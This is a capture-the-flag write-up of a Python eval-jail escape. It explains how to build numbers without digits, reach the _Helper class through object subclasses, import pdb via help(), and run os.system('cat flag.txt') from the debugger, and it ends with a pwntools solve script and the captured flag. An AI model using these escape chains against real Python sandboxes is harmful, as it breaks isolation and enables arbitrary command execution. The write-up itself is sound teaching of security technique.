---
title: Michael Schofield
---
# Michael Schofield

This was a binary exploitation problem, but it was actually just a Python jail.

## Description

T-Bag: "You think you're the smartest man in the room?"

Michael: "No. But I don't need to be. I just need to be the one with the plan."

Flag is in `flag.txt`.

## Provided files

`sandbox.py`:

```python
def check_pattern(user_input):
    """
    This function will check if numbers or strings are in user_input.
    """
    return '"' in user_input or '\'' in user_input or any(str(n) in user_input for n in range(10))


while True:
    user_input = input(">> ")

    if len(user_input) == 0:
        continue

    if len(user_input) > 500:
        print("Too long!")
        continue

    if not __import__("re").fullmatch(r'([^()]|\(\))*', user_input):
        print("No function calls with arguments!")
        continue

    if check_pattern(user_input):
       print("Numbers and strings are forbbiden")
       continue

    forbidden_keywords = ['eval', 'exec', 'import', 'open']
    forbbiden = False
    for word in forbidden_keywords:
        if word in user_input:
            forbbiden = True

    if forbbiden:
        print("Forbbiden keyword")
        continue

    try:
        output = eval(user_input, {"__builtins__": None}, {})
        print(output)
    except:
        print("Error")
```

## Solution

This is an `eval` jail, which means we can only do expressions, not statements.
In addition, it only uses one line of input. However, we get as many
single-line inputs as we'd like within the same process.

There are a few restrictions. Going from top to bottom:

- No single or double quotes, meaning no strings.
- No numbers
- No parenthesis with items inside. This means no function calls, but also no
  parenthesis for order of operations or tuples.
- 500 characters per line
- The words `eval`, `exec`, `import`, and `open` are forbidden.
- There are no built-ins and no locals.

This is a tough jail, but we can beat it little by little.

Reading online, I found [this jail escape collection](https://shirajuki.js.org/blog/pyjail-cheatsheet/#seccon-ctf-13-1linepyjail)
which referenced [a SECCON 13 jail](https://github.com/SECCON/SECCON13_online_CTF/blob/main/jail/1linepyjail/solver/exploit.py).

In the solution, they used the `help` built-in to import `pdb`, Python's
debugger, which can be activated using `pdb.set_trace()`. From there, we are
outside the restrictions of the jail, and can call `open('flag.txt')` just
fine.

First, however, we have some primitives we need to build.

### Numbers and math

Numbers are not allowed, but `True` (1) and `False` (0) are. Therefore, we can
do things like `True+True` (2) or even `True<<True+True` (4). We're limited by
the 500 character limit, which restricts the numbers we can use, but it turns
out that none of the lines we send are remotely close to 500.

The other issue is that order of operations can make certain numbers a pain to
get to, since we can't use parenthesis to group operations. We can, however, use
arrays and indexing with `False`, like `[True+True][False]*True`.

### Indexing into dictionaries

Python stores most of its fun things in either lists, which can be indexed by
our math above, or dictionaries, which can be indexed by strings. We don't have
strings, but we do have `.values()`, which takes the values of the dictionary
and places them into an almost-list.

We can convert this almost-list into a full, indexable list using a list
comprehension like this: `[x for x in {}.values()]`.

### Getting help

The `help` keyword in Python is actually a class, which means it can be
accessed via the subclasses of object. We can access those using double
underscore ("dunder") properties of objects. We can use the tuple object, `()`,
to get access to all the subclasses of object:

`().__class__.__base__.__subclasses__()`

We can then use index 159 to access `<class '_sitebuiltins._Helper'>`, which
can be instantiated into `help`:

```
>> ().__class__.__base__.__subclasses__()[[True+True+True+True+True<<True+True+True+True+True][False]-True]()
Type help() for interactive help, or help(object) for help about object.
```

Finally, we call the `help` object to enter the interactive help session:

```
().__class__.__base__.__subclasses__()[[True+True+True+True+True<<True+True+True+True+True][False]-True]()()
Welcome to Python 3.12's help utility! If...
```

The only question is, why do we need `help`?

It turns out that running `help` on a module automatically imports it into the
process. This gets around not being able to use `import`. Therefore we can
run `pdb` in the `help` session to import it.

How do we get back to the sandbox?

We can use `quit`, but that's boring! Instead we can get the "help" for
`sandbox`, which imports the entirety of `sandbox.py` again. Of course,
since `sandbox.py` does not use `if __name__ == "__main__":`, it automatically
reruns the whole sandbox again.

### Globals and modules

The globals contains some of the built-in modules. If we can index into `sys`,
we can call `sys.modules`.

It turns out that some of the subclasses have an `__init__` function that has
all of the globals in a dictionary, including the last in the subclasses. We
can index this with `-True`:

`().__class__.__base__.__subclasses__()[-True].__init__.__globals__`

Using the dictionary indexing primitive we discussed above, and the index 22,
we can access `sys`:

```
>> [x for x in ().__class__.__base__.__subclasses__()[-True].__init__.__globals__.values()][[True+True+True<<True+True+True][False]-True-True]
<module 'sys' (built-in)>
```

The modules are quite long, but they are yet another dictionary that we can
convert to a list. Afterwards, it turns out that `pdb` is the second to last
thing we imported (`sandbox` being the last), so we can use `~True` to access
it:

`[x for x in [x for x in ().__class__.__base__.__subclasses__()[-True].__init__.__globals__.values()][[True+True+True<<True+True+True][False]-True-True].modules.values()][~True].set_trace()`

### Using PDB

Python's debugger is free from the sandbox, so we can call Python functions. It is
similar to `gdb`, so we can simply use `p` to print whatever we want. 

Unfortunately, we still exist in the `eval`, so we can't just call `open`. We'll
have to go through `()` again.

## Solve Script

```python
from pwn import *
r = remote("0.cloud.chals.io", 33618)
r.sendline(b"().__class__.__base__.__subclasses__()[[True+True+True+True+True<<True+True+True+True+True][False]-True]()()")
r.sendline(b"pdb")
r.sendline(b"sandbox")
r.sendline(b"[x for x in [x for x in ().__class__.__base__.__subclasses__()[-True].__init__.__globals__.values()][[True+True+True<<True+True+True][False]-True-True].modules.values()][~True].set_trace()")
r.sendline(b"p ().__class__.__bases__[False].__subclasses__()[-1].__init__.__globals__['__builtins__']['__import__']('os').system('cat flag.txt')")
r.interactive()
```

Flag: `FortID{Wh3n_7h3_517u4710n_l00k5_1mp0551bl3,_y0u_d0n7_g1v3_up}`

Funnily enough, I was about to throw in the towel after going down the wrong
rabbit hole for 5 hours. I spent too long trying to use decorators to call
functions, which is only feasible in multi-line jails.
